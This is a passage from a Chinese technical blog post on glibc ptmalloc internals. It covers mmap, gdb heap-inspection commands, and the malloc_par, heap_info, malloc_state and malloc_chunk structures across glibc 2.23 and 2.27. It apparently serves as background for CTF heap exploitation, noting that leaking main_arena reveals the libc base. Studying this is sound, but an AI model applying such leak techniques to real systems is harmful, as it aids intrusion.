系统中主要作用是将文件或设备映射到进程的虚拟地址空间，也可以用于在不依赖文件的情况下分配匿名内存区域。</p><p><code>mmap</code>在内存分配中用于匿名映射，直接向操作系统请求内存，而不改变进程的堆区域。这样分配方式要比<code>brk</code>更灵活一点，适合分配较大的内存块。<code>malloc</code>函数的实现中，通过使用<code>mmap</code>分配超过一定大小（如128kb）的内存块。</p><p><code>munmap</code>函数用于将特定地址区域的对象映射删除掉。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">munmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr,<span class="hljs-type">size_t</span> length)</span>;<br></code></pre></td></tr></table></figure><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><ul><li>常用命令</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">vmmap #查看进程的内存布局<br>heap #查看所有堆<br>bins #查看所有bin<br>heap -v #查看堆块的详细信息<br>vis #可视化堆<br>arena #显示arena的详细信息<br>x/32gx &amp;main_arena #查看main_arena上的值<br>call malloc_stats() #打印malloc分配的内存<br>p malloc(0x100) #打印分配的堆块<br>heapbase #查看堆的起始地址<br>heapinfo #显示堆的信息<br>parseheap #显示堆结构<br>info threads #多线程调试<br>tracemalloc #会提示所有操作堆的地方<br>arenas #显示所有arena的基本信息<br>arenainfo #好看的显示所有arena的信息<br>p &amp;__free_hook #查看某个函数的真实地址<br>p *__free_hook #查看某个函数的指向<br></code></pre></td></tr></table></figure><p>个人比较喜欢通过<code>patchelf</code>修改程序<code>ld</code>和<code>libc</code>进行调试。</p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>glibc 的数据结构中有<code>tcache</code>机制和没有<code>tcache</code>机制是存在一些区别的。</p><p>这里我们会对比没有<code>tcache</code>机制的 glibc2.23 和 有<code>tcache</code>机制的 glibc2.27 的区别。</p><h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><p>在 ptmalloc 中使用<code>malloc_par</code>结构体来记录堆管理器的相关参数，该结构体定义于<code>malloc.c</code>中，如下：</p><ul><li>2.23</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Tunable parameters */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trim_threshold;<br>  INTERNAL_SIZE_T top_pad;<br>  INTERNAL_SIZE_T mmap_threshold;<br>  INTERNAL_SIZE_T arena_test;<br>  INTERNAL_SIZE_T arena_max;<br><br>  <span class="hljs-comment">/* Memory map support */</span><br>  <span class="hljs-type">int</span> n_mmaps;<br>  <span class="hljs-type">int</span> n_mmaps_max;<br>  <span class="hljs-type">int</span> max_n_mmaps;<br>  <span class="hljs-comment">/* the mmap_threshold is dynamic, until the user sets</span><br><span class="hljs-comment">     it manually, at which point we need to disable any</span><br><span class="hljs-comment">     dynamic behavior. */</span><br>  <span class="hljs-type">int</span> no_dyn_threshold;<br><br>  <span class="hljs-comment">/* Statistics */</span><br>  INTERNAL_SIZE_T mmapped_mem;<br>  <span class="hljs-comment">/*INTERNAL_SIZE_T  sbrked_mem;*/</span><br>  <span class="hljs-comment">/*INTERNAL_SIZE_T  max_sbrked_mem;*/</span><br>  INTERNAL_SIZE_T max_mmapped_mem;<br>  INTERNAL_SIZE_T max_total_mem;  <span class="hljs-comment">/* only kept for NO_THREADS */</span><br><br>  <span class="hljs-comment">/* First address handed out by MORECORE/sbrk.  */</span><br>  <span class="hljs-type">char</span> *sbrk_base;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>2.27</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span>  </span><br><span class="hljs-class">&#123;</span>  <br>  <span class="hljs-comment">/* Tunable parameters */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trim_threshold;  <br>  INTERNAL_SIZE_T top_pad;  <br>  INTERNAL_SIZE_T mmap_threshold;  <br>  INTERNAL_SIZE_T arena_test;  <br>  INTERNAL_SIZE_T arena_max;  <br>  <br>  <span class="hljs-comment">/* Memory map support */</span>  <br>  <span class="hljs-type">int</span> n_mmaps;  <br>  <span class="hljs-type">int</span> n_mmaps_max;  <br>  <span class="hljs-type">int</span> max_n_mmaps;  <br>  <span class="hljs-comment">/* the mmap_threshold is dynamic, until the user sets  </span><br><span class="hljs-comment">     it manually, at which point we need to disable any     </span><br><span class="hljs-comment">     dynamic behavior. */</span>  <br>  <span class="hljs-type">int</span> no_dyn_threshold;  <br>  <br>  <span class="hljs-comment">/* Statistics */</span>  <br>  INTERNAL_SIZE_T mmapped_mem;  <br>  INTERNAL_SIZE_T max_mmapped_mem;  <br>  <br>  <span class="hljs-comment">/* First address handed out by MORECORE/sbrk.  */</span>  <br>  <span class="hljs-type">char</span> *sbrk_base;  <br>  <br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE  </span><br>  <span class="hljs-comment">/* Maximum number of buckets to use.  */</span>  <br>  <span class="hljs-type">size_t</span> tcache_bins;  <br>  <span class="hljs-type">size_t</span> tcache_max_bytes;  <br>  <span class="hljs-comment">/* Maximum number of chunks in each bucket.  */</span>  <br>  <span class="hljs-type">size_t</span> tcache_count;  <br>  <span class="hljs-comment">/* Maximum number of chunks to remove from the unsorted list, which  </span><br><span class="hljs-comment">     aren&#x27;t used to prefill the cache.  */</span>  <br>  <span class="hljs-type">size_t</span> tcache_unsorted_limit;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span>  </span><br>&#125;;<br></code></pre></td></tr></table></figure><p><code>malloc_par</code>结构体定义了和<code>mmap</code>和<code>arena</code>相关的一些参数，以及<code>sbrk</code>的基址，其中重要的参数解释如下：</p><ul><li><code>top_pad</code>：初始化或扩展堆的时候需要多申请的内存大小。</li><li><code>mmap_threshold</code>：决定<code>sysmalloc</code>是通过<code>mmap</code>或<code>sbrk</code>分配内存的界限，即如果申请的内存大小不小于该值则采用<code>mmap</code>分配，否则采用<code>sbrk</code>扩展<code>heap</code>区域分配。并且这个值是动态调整的，如果释放的内存是通过<code>mmap</code>得到的则<code>mmap_threshold</code>与该内存大小取<code>max</code>。并且<code>mmap_threshold</code>最大不能超过<code>DEFAULT_MMAP_THRESHOLD_MAX</code>，即 0x2000000。</li><li><code>trim_threshold</code>：用于<code>main_arena</code>中保留内存量的控制。当释放的<code>chunk</code>为<code>mmap</code>获得的，同时大小大于<code>mmap_threshold</code>，则除了更新<code>mmap_threshold</code>外还会将<code>trim_threshold</code>乘2。当释放的<code>chunk</code>大小不在<code>fast bin</code>范围合并完<code>size</code>大于<code>FASTBIN_CONSOLIDATION_THRESHOLD</code>即0x10000，会根据该字段缩小<code>top chunk</code>。</li><li><code>n_mmaps</code>：<code>mmap</code>的内存数量，即 ptmalloc 每次成功<code>mmap</code>则<code>n_mmpas</code>加 1，ptmalloc 每次成功<code>munmap</code>则<code>n_mmaps</code>减1。</li><li><code>n_mmaps_max</code>：<code>n_mmaps</code>的上限，即最多能<code>mmap</code>的内存数量。</li><li><code>max_n_mmaps</code>：<code>n_mmaps</code>达到过的最大值。</li><li><code>mmapped_mem</code>：当前<code>mmap</code>的内存大小总和。</li><li><code>max_mmapped_mem</code>：<code>mmap</code>的内存大小总和达到过的最大值。</li><li><code>sbrk_base</code>：表示通过<code>brk</code>系统调用申请的<code>heap</code>区域的起始地址。</li><li><code>no_dyn_threshold</code>：表示是否禁用<code>heap</code>动态调整保留内存的大小，默认为0。</li></ul><p>该结构体类型的实例<code>mp_</code>用以记录 ptmalloc 相关参数，同样定义于<code>malloc.h</code>中，如下：</p><ul><li>2.23</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* There is only one instance of the malloc parameters.  */</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> <span class="hljs-title">mp_</span> =</span><br>&#123;<br>  .top_pad = DEFAULT_TOP_PAD,<br>  .n_mmaps_max = DEFAULT_MMAP_MAX,<br>  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,<br>  .trim_threshold = DEFAULT_TRIM_THRESHOLD,<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span><br>  .arena_test = NARENAS_FROM_NCORES (<span class="hljs-number">1</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>2.27</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> <span class="hljs-title">mp_</span> =</span>  <br>&#123;  <br>  .top_pad = DEFAULT_TOP_PAD,  <br>  .n_mmaps_max = DEFAULT_MMAP_MAX,  <br>  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,  <br>  .trim_threshold = DEFAULT_TRIM_THRESHOLD,  <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))  </span><br>  .arena_test = NARENAS_FROM_NCORES (<span class="hljs-number">1</span>)  <br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE  </span><br>  ,  <br>  .tcache_count = TCACHE_FILL_COUNT,  <br>  .tcache_bins = TCACHE_MAX_BINS,  <br>  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="hljs-number">-1</span>),  <br>  .tcache_unsorted_limit = <span class="hljs-number">0</span> <span class="hljs-comment">/* No limit.  */</span>  <br><span class="hljs-meta">#<span class="hljs-keyword">endif</span>  </span><br>&#125;;<br></code></pre></td></tr></table></figure><p>在 gdb 调试时我们可以通过<code>p mp_</code>命令查看该实例值。</p><p>或者可以通过<code>display mp_</code>命令来动态查看所有<code>malloc_par</code>字段的值</p><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p><code>heap_info</code>位于一个<code>heap</code>块的开头，用以记录通过<code>mmap</code>系统调用从 Memory Mapping Segment 处申请到的内存块的信息。定义于<code>arena.c</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* A heap is a single contiguous memory region holding (coalesceable)</span><br><span class="hljs-comment">   malloc_chunks.  It is allocated with mmap() and always starts at an</span><br><span class="hljs-comment">   address aligned to HEAP_MAX_SIZE.  */</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>  mstate ar_ptr; <span class="hljs-comment">/* Arena for this heap. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span> <span class="hljs-comment">/* Previous heap. */</span><br>  <span class="hljs-type">size_t</span> size;   <span class="hljs-comment">/* Current size in bytes. */</span><br>  <span class="hljs-type">size_t</span> mprotect_size; <span class="hljs-comment">/* Size in bytes that has been mprotected</span><br><span class="hljs-comment">                           PROT_READ|PROT_WRITE.  */</span><br>  <span class="hljs-comment">/* Make sure the following data is properly aligned, particularly</span><br><span class="hljs-comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span><br><span class="hljs-comment">     MALLOC_ALIGNMENT. */</span><br>  <span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];<br>&#125; heap_info;<br></code></pre></td></tr></table></figure><p><code>heap_info</code>结构体的成员如下：</p><ul><li><code>ar_ptr</code>：指向管理该堆块的<code>arena</code></li><li><code>prev</code>：该<code>heap_info</code>所链接的上一个<code>heap_info</code></li><li><code>size</code>：记录该堆块的大小</li><li><code>mprotect_size</code>：记录该堆块中被保护（<code>mprotected</code>）的大小。</li><li><code>pad</code>：即<code>padding</code>，用以在<code>SIZE_SZ</code>不正常的情况下进行填充以让内存对齐，正常情况下<code>pad</code>所占用空间应为0字节。</li></ul><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>大部分情况下对于每个线程而言其都会单独有着一个<code>arena</code>实例用以管理属于该线程的堆内存区域。</p><p><code>ptmalloc</code>内部的内存池是由<code>malloc_state</code>结构体进行定义的，即<code>arena</code>本身便为<code>malloc_state</code>的一个实例对象。</p><p><code>malloc_state</code>结构体定义于<code>malloc.c</code>中，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  <span class="hljs-type">mutex_t</span> mutex;<br><br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<br><br>  <span class="hljs-comment">/* Fastbins */</span><br>  <span class="hljs-comment">//NFASTBINS宏用于计算fastbin数组的大小</span><br>  <span class="hljs-comment">//#define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)</span><br>  <br>  <span class="hljs-comment">//MAX_FAST_SIZE是glibc中定义的最大fastbin大小，通常为一个常量</span><br>  <span class="hljs-comment">//#define MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br>  <span class="hljs-comment">//64位下为160,32位为80  </span><br>  <br>  <span class="hljs-comment">//首先通过request2size将申请的内存大小转化为合适的chunk大小</span><br>  <span class="hljs-comment">/*#define request2size(req) \</span><br><span class="hljs-comment">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ? \</span><br><span class="hljs-comment">   MINSIZE : \</span><br><span class="hljs-comment">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="hljs-comment">   */</span><br><br>  <span class="hljs-comment">//64位结果为172，32位结果为84</span><br>  <span class="hljs-comment">//然后通过fastbin_index计算chunk size对应的fastbin索引</span><br>  <span class="hljs-comment">//32位结果为9，64位结果也为9</span><br><br>  <span class="hljs-comment">//实际上fastbinY数组的大小是10，这是因为额外保留了一个位置用于其它特殊目的</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br><br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<br><br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<br><br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  <span class="hljs-comment">//NBINS是一个宏定义，值为128</span><br>  <span class="hljs-comment">//bins[254]</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br><br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-comment">//BINMAPSIZE (NBINS / BITSPERMAP)</span><br>  <span class="hljs-comment">//结果为4</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-comment">//指向下一个arena</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-comment">//指向下一个空闲内存区域的指针</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  <span class="hljs-comment">//在多线程内存管理中，记录当前有多少个线程与特定的arena相关联</span><br>  INTERNAL_SIZE_T attached_threads;<br><br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>2.27</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_lock_define (, mutex);  <br>  <br><span class="hljs-comment">/* Flags (formerly in max_fast).  */</span>  <br><span class="hljs-type">int</span> flags;  <br>  <br><span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span>  <br><span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span>  <br><span class="hljs-type">int</span> have_fastchunks;<br></code></pre></td></tr></table></figure><p><code>malloc_state</code>结构体的成员如下：</p><ul><li><code>mutex</code>：<code>mutex</code>变量即为多线程互斥锁，用以保证线程安全。</li><li><code>flags</code>：标志位，用以表示<code>arena</code>的一些状态，如：是否有<code>fastbin</code>、内存是否连续等。</li><li><code>fastbinY</code>：存放 fastbin chunk的数组，一共有10个fastbin chunk。</li><li><code>top</code>：指向<code>Top chunk</code>的指针。</li><li><code>last_remainder</code>：<code>chunk</code>切割中的剩余部分。<code>malloc</code>在分配<code>chunk</code>时若是没找到<code>size</code>合适的<code>chunk</code>而是找到了一个<code>size</code>更大的<code>chunk</code>，则会从大<code>chunk</code>中切割掉一块返回给用户，剩下的那一块便是<code>last_remainder</code>，其随后会被放入<code>unsorted bin</code>中。</li><li><code>bins</code>：存放闲置<code>chunk</code>的数组。<code>bins</code>包括<code>large bin</code>，<code>small bin</code>和<code>unsorted bin</code>。</li><li><code>binmap</code>：记录<code>bin</code>是否为空的<code>bitset</code>。需要注意的是<code>chunk</code>被取出后若一个<code>bin</code>空了并不会立即被置0，而会在下一次遍历到时重新置位。</li><li><code>system_mem</code>：记录当前<code>arena</code>在堆区中所分配到的内存的总大小。</li><li><code>max_system_mem</code>：当操作系统予进程以内存时，<code>system_mem</code>会随之增大，当内存被返还给操作系统时，<code>system_mem</code>会随之减小，<code>max_system_mem</code>变量便是用来记录在这个过程中<code>system_mem</code>的峰值。</li></ul><p>在gdb调试中我们可以通过<code>p &amp;main_arena</code>来查看<code>main arena</code></p><p><code>main_arena</code>为一个定义于<code>malloc.c</code>中的静态的<code>malloc_state</code>结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* There are several instances of this struct (&quot;arenas&quot;) in this</span><br><span class="hljs-comment">   malloc.  If you are adapting this malloc in a way that does NOT use</span><br><span class="hljs-comment">   a static or mmapped malloc_state, you MUST explicitly zero-fill it</span><br><span class="hljs-comment">   before using. This malloc relies on the property that malloc_state</span><br><span class="hljs-comment">   is initialized to all zeroes (as is true of C statics).  */</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> <span class="hljs-title">main_arena</span> =</span><br>&#123;<br>  .mutex = _LIBC_LOCK_INITIALIZER,<br>  .next = &amp;main_arena,<br>  .attached_threads = <span class="hljs-number">1</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>由于其为 libc 中的静态变量，该<code>arena</code>会随着 libc 文件一同加载到 Memory Mapping Segment。因此在堆题中通常通过泄露<code>arena</code>的地址以获得 libc 在内存中的基地址。</p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>在程序执行的过程中，我们称由<code>malloc</code>申请的内存为<code>chunk</code>。这块内存在<code>ptmalloc</code>内部用<code>malloc_chunk</code>结构体来表示。当程序申请的<code>chunk</code>被<code>free</code>后，会被加入到相应的空闲管理链表中。</p><p>我们在malloc一块内存的时候返回给我们的指针是指向user data的指针</p><p><code>malloc_chunk</code>定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>每个字段的具体的解释如下：</p><ul><li><code>prev_size</code>：如果物理相邻的前一地址<code>chunk</code>是空闲的话，那该字段记录的是前一个<code>chunk</code>的大小（包括<code>chunk</code>头）。否则，该字段可以用来存储物理相邻的前一个<code>chunk</code>的数据。</li><li><code>size</code>：该<code>chunk</code>的大小，大小必须是<code>2 * SIZE_SZ</code>的整数倍。该字段的低三个比特位对<code>chunk</code>的大小没有影响，它们从高到低分别表示为：<ul><li><code>NON_MAIN_ARENA</code>，记录当前<code>chunk</code>是否不属于主线程，1 表示不属于，0 表示属于。</li><li><code>IS_MAPPED</code>，记录当前<code>chunk</code>是否是由<code>mmap</code>分配的。</li><li><code>PREV_INUSE</code>，记录前一个<code>chunk</code>块是否被分配。一般来说，堆中第一个被分配的内存块的<code>size</code>字段的<code>P</code>位都会被设置为 1，以便于防止访问前面的非法内存。当一个<code>chunk</code>的<code>size</code>的<code>P</code>位为0时，我们能通过<code>prev_size</code>字段来获取上一个<code>chunk</code>的大小以及地址。这也方便进行空闲<code>chunk</code>之间的合并。</li></ul></li><li><code>fd</code>，<code>bk</code>。<code>chunk</code>处于分配状态时，从<code>fd</code>字段开始是用户的数据。<code>chunk</code>空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<ul><li><code>fd</code>指向下一个（非物理相邻）空闲的<code>chunk</code></li><li><code>bk</code>指向上一个（非物理相邻）空闲的<code>chunk</code></li></ul></li></ul><p>通过<code>fd</code>和<code>bk</code>可以将空闲的<code>chunk</code>块加入到空闲的<code>chunk</code>块链表进行统一管理。</p><ul><li><code>fd_nextsize</code>，<code>bk_nextsize</code>，也是只有<code>chunk</code>空闲的时候才使用，不过其用于较大的<code>chunk</code>（large chunk）。<ul><li><code>fd_nextsize</code>：指向前一个与当前<code>chunk</code>大小不同的第一个空闲块，不包含<code>bin</code>的头指针。</li><li><code>bk_nextsize</code>：指向后一个与当前<code>chunk</code>大小不同的第一个空闲块，不包含<code>bin</code>的头指针。</li><li>一般空闲的<code>large chunk</code>在<code>fd</code>的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适<code>chunk</code>时挨个遍历。</li></ul></li></ul><p><code>chunk</code>的结构</p><p><img src="/assets/Pasted%20image%2020241119212358.png"></p><h3 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h3><p>用户释放掉的<code>chunk</code>不会马上归还给系统，ptmalloc 会统一管理<code>heap</code>和<code>mmap</code>映射区域中的空闲的<code>chunk</code>。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的<code>chunk</code>中挑选一块合适的给用户。这也可以避免频繁的系统调用，降低内存分配的开销。</p><p>在具体的实现中，ptmalloc 采用分箱式方法对空闲的<code>chunk</code>进行管理。首先，它会根据空闲的<code>chunk</code>的大小以及使用状态将<code>chunk</code>初步分为4类：<code>fast 